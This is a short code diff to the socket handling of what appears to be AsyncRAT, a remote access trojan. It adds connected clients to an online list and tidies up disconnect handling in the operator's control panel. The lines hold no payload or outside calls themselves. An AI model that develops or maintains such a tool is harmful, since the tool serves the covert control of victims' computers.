@@ -33,6 +33,7 @@ namespace AsyncRAT_Sharp.Sockets
             MS = new MemoryStream();
             LV = null;
             Read += HandlePacket.Read;
+            Settings.Online.Add(this);
             Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
         }
 
@@ -97,12 +98,16 @@ namespace AsyncRAT_Sharp.Sockets
         delegate void _isDisconnected();
         public void Disconnected()
         {
-            if (Program.form1.listView1.InvokeRequired)
-                Program.form1.listView1.BeginInvoke(new _isDisconnected(Disconnected));
-            else
+            if (LV != null)
             {
-                LV.Remove();
+                if (Program.form1.listView1.InvokeRequired)
+                    Program.form1.listView1.BeginInvoke(new _isDisconnected(Disconnected));
+                else
+                {
+                    LV.Remove();
+                }
             }
+            Settings.Online.Remove(this);
             try
             {
                 MS.Dispose();
